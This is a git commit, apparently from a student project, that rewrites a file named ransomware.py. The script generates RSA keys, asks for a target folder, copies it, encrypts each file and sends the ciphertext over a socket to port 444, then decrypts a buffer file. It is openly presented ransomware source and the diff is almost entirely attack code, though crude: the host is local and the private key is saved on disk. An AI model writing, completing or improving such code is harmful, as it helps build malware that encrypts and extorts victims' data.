3a2d1b788b15c1dbb7d87952abed77528d21f791
Antonin Pellegrini <antonin.pellegrini@epita.fr>
2023-11-26 15:53:49 +0100

    j'avais upload le mauvais fichier, my bad

--- ransomware/ransomware.py
+++ ransomware/ransomware.py
@@ -1,12 +1,16 @@
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.backends import default_backend
 import shutil
 import socket
 import os
 
 private_key = rsa.generate_private_key(
     public_exponent=65537,
-    key_size=2048
+    key_size=2048,
+    backend=default_backend()
 )
 
 pem_private_key = private_key.private_bytes(
@@ -15,40 +19,61 @@ pem_private_key = private_key.private_bytes(
     encryption_algorithm=serialization.NoEncryption()
 )
 
-print(pem_private_key.splitlines()[0])
-
 pem_public_key = private_key.public_key().public_bytes(
-  encoding=serialization.Encoding.PEM,
-  format=serialization.PublicFormat.SubjectPublicKeyInfo
+    encoding=serialization.Encoding.PEM,
+    format=serialization.PublicFormat.SubjectPublicKeyInfo
 )
 
-print(pem_public_key.splitlines()[0])
+with open("private_key.pem", "wb") as f:
+    f.write(pem_private_key)
 
-private_key_file = open("example-rsa.pem", "w")
-private_key_file.write(pem_private_key.decode())
-private_key_file.close()
+with open("public_key.pem", "wb") as f:
+    f.write(pem_public_key)
 
-public_key_file = open("example-rsa.pub", "w")
-public_key_file.write(pem_public_key.decode())
-public_key_file.close()
+folder = input("Entrez le dossier cible: ")
 
-folder = input("entrez le dossier cible: ")
-if os.path.exits("backup_folder"):
+if os.path.exists("backup_folder"):
     shutil.rmtree("backup_folder")
 shutil.copytree(folder, 'backup_folder')
 
-
 client = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
-
 host = socket.gethostname()
 port = 444
-
 print("Connection to", host, port)
-client.connect((host,port))
+client.connect((host, port))
 
-os.listdir()
+for root, dirs, files in os.walk("backup_folder"):
+    for file in files:
+        with open(os.path.join(root, file), "rb") as f:
+            data = f.read()
+            public_key = serialization.load_pem_public_key(
+                pem_public_key,
+                backend=default_backend()
+            )
+            encrypted_data = public_key.encrypt(
+                data,
+                padding.OAEP(
+                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                    algorithm=hashes.SHA256(),
+                    label=None
+                )
+            )
+            client.sendall(encrypted_data)
 
-
-dir = os.path.dirname(os.path.realpath(__file__))
-priv = rsa
-
+with open("buffer_file", "rb") as f:
+    data = f.read()
+    private_key = serialization.load_pem_private_key(
+        pem_private_key,
+        password=None,
+        backend=default_backend()
+    )
+    decrypted_data = private_key.decrypt(
+        data,
+        padding.OAEP(
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        )
+    )
+    with open("decrypted_buffer_file", "wb") as f:
+        f.write(decrypted_data)
